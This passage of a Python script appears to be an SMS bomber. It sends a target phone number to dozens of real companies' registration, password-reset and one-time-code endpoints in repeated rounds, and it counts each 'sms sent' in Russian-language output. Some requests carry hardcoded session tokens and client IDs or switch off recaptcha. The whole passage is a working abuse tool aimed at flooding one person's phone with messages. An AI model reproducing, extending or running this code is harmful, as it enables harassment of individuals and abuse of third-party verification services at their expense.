                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://oauth.av.ru/check-phone",
                    json={"phone": (_phone, "+* (***) ***-**-**")},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
                    params={"msisdn": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://city24.ua/personalaccount/account/registration",
                    data={"PhoneNumber": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://client-api.sushi-master.ru/api/v1/auth/init",
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post("https://auth.multiplex.ua/login", json={"login": _phone})
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.niyama.ru/ajax/sendSMS.php",
                    data={
                        "REGISTER[PERSONAL_PHONE]": _phone,
                        "code": "",
                        "sendsms": "Выслать код",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.easypay.ua/api/auth/register",
                    json={"phone": _phone, "password": _password},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://fix-price.ru/ajax/register_phone_code.php",
                    data={
                        "register_call": "Y",
                        "action": "getCode",
                        "phone": "+" + _phone,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.nl.ua",
                    data={
                        "component": "bxmaker.authuserphone.login",
                        "sessid": "bf70db951f54b837748f69b75a61deb4",
                        "method": "sendCode",
                        "phone": _phone,
                        "registration": "N",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://msk.tele2.ru/api/validation/number/" + _phone,
                    json={"sender": "Tele2"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.get(
                    "https://www.finam.ru/api/smslocker/sendcode",
                    data={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://makimaki.ru/system/callback.php",
                    params={
                        "cb_fio": _name,
                        "cb_phone": format(_phone, "+* *** *** ** **"),
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.flipkart.com/api/6/user/signup/status",
                    headers={
                        "Origin": "https://www.flipkart.com",
                        "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop",
                    },
                    json={"loginId": "+" + _phone, "supportAllStates": True},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://secure.online.ua/ajax/check_phone/",
                    params={"reg_phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://cabinet.planetakino.ua/service/sms",
                    params={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ontaxi.com.ua/api/v2/web/client",
                    json={"country": _codes[_code].upper(), "phone": _phone,},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://smart.space/api/users/request_confirmation_code/",
                    json={"mobile": "+" + _phone, "action": "confirm_mobile"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
                    json={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.tarantino-family.com/wp-admin/admin-ajax.php",
                    data={
                        "action": "ajax_register_user",
                        "step": "1",
                        "security_login": "50a8c243f6",
                        "phone": _phone,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://apteka.ru/_action/auth/getForm/",
                    data={
                        "form[NAME]": "",
                        "form[PERSONAL_GENDER]": "",
                        "form[PERSONAL_BIRTHDAY]": "",
                        "form[EMAIL]": "",
                        "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
                        "form[PASSWORD]": password,
                        "get-new-password": "Получите пароль по SMS",
                        "user_agreement": "on",
                        "personal_data_agreement": "on",
                        "formType": "simple",
                        "utc_offset": "120",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://uklon.com.ua/api/v1/account/code/send",
                    headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
                    json={"phone": _phone, "otpId": 0},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.get(
                    "https://requests.service.banki.ru/form/960/submit",
                    params={
                        "callback": "submitCallback",
                        "name": _name,
                        "phone": "+" + _phone,
                        "email": _email,
                        "gorod": "Москва",
                        "approving_data": "1",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.ivi.ru/mobileapi/user/register/phone/v6",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.moyo.ua/identity/registration",
                    data={"firstname": _name, "phone": _phone, "email": _email},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://helsi.me/api/healthy/accounts/login",
                    json={"phone": _phone, "platform": "PISWeb"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.kinoland.com.ua/api/v1/service/send-sms",
                    headers={"Agent": "website"},
                    json={"Phone": _phone, "Type": 1},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://pizzahut.ru/account/password-reset",
                    data={
                        "reset_by": "phone",
                        "action_id": "pass-recovery",
                        "phone": _phonePizzahut,
                        "_token": "*",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.rabota.ru/remind", data={"credential": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://rutube.ru/api/accounts/sendpass/phone",
                    data={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.citilink.ru/registration/confirm/phone/+"
                    + _phone
                    + "/"
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php",
                    data={"name": _name, "phone": _phone, "promo": "yellowforma"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.get(
                    "https://www.oyorooms.com/api/pwa/generateotp?phone="
                    + _phone9
                    + "&country_code=%2B7&nod=4&locale=en"
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
                    params={"pageName": "registerPrivateUserPhoneVerificatio"},
                    data={
                        "phone": _phone,
                        "recaptcha": "off",
                        "g-recaptcha-response": "",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://newnext.ru/graphql",
                    json={
                        "operationName": "registration",
                        "variables": {
                            "client": {
                                "firstName": "Иван",
                                "lastName": "Иванов",
                                "phone": _phone,
                                "typeKeys": ["Unemployed"],
                            }
                        },
                        "query": "mutation registration($client: ClientInput!) {"
                        "\n  registration(client: $client) {"
                        "\n	token\n	__typename\n  }\n}\n",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.sunlight.net/v3/customers/authorization/",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
                    json={
                        "client_type": "personal",
                        "email": _email,
                        "mobile_phone": _phone,
                        "deliveryOption": "sms",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://lk.invitro.ru/lk2/lka/patient/refreshCode",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://online.sbis.ru/reg/service/",
                    json={
                        "jsonrpc": "2.0",
                        "protocol": "5",
                        "method": "Пользователь.ЗаявкаНаФизика",
                        "params": {"phone": _phone},
                        "id": "1",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ib.psbank.ru/api/authentication/extendedClientAuthRequest",
                    json={
                        "firstName": "Иван",
                        "middleName": "Иванович",
                        "lastName": "Иванов",
                        "sex": "1",
                        "birthDate": "10.10.2000",
                        "mobilePhone": _phone9,
                        "russianFederationResident": "true",
                        "isDSA": "false",
                        "personalDataProcessingAgreement": "true",
                        "bKIRequestAgreement": "null",
                        "promotionAgreement": "true",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app.karusel.ru/api/v1/phone/", data={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
                    json={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
                    params={"msisdn": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.delitime.ru/api/v2/signup",
                    data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.get(
                    "https://findclone.ru/register", params={"phone": "+" + _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://guru.taxi/api/v1/driver/session/verify",
                    json={"phone": {"code": 1, "number": _phone}},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.icq.com/smsreg/requestPhoneValidation.php",
                    data={
                        "msisdn": _phone,
                        "locale": "en",
                        "countryCode": "ru",
                        "version": "1",
                        "k": "ic1rtwz1s1Hj1O0r",
                        "r": "46763",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://terra-1.indriverapp.com/api/authorization?locale=ru",
                    data={
                        "mode": "request",
                        "phone": "+" + _phone,
                        "phone_permission": "unknown",
                        "stream_id": 0,
                        "v": 3,
                        "appversion": "3.20.6",
                        "osversion": "unknown",
                        "devicemodel": "unknown",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                    data={
                        "password": password,
                        "application": "lkp",
                        "login": "+" + _phone,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.ivi.ru/mobileapi/user/register/phone/v6",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api-rest.logistictech.ru/api/v1.1/clients/request-code",
                    json={"phone": _phone,},
                    headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://pizzasinizza.ru/api/phoneCode.php",
                    json={"phone": _phone,},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.get(
                    "https://vezitaxi.com/api/employment/getsmscode",
                    params={
                    	"phone": "+" + _phone,
                    	"city": 561,
                    	"callback": "jsonp_callback_35979",
            	    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app.benzuber.ru/login",
                    data={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://3040.com.ua/taxi-ordering",
                    data={"callback-phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            kolvo = kolvo + 1
            if kolvo == kolvos:
                print(
                    f"\n\n\n{y}Пройден последний {kolvo} круг, sms отправлено {kk}{sr}\nЗавершение работы.\n\n\n"
                )
                exit()
            else:
                print(
                    f"\n\n\n{y}Пройден {kolvo} круг, sms отправлено {kk}{sr}\nНачало следующего круга через 30 секунд.\n\n\n"
                )
                time.sleep(30)
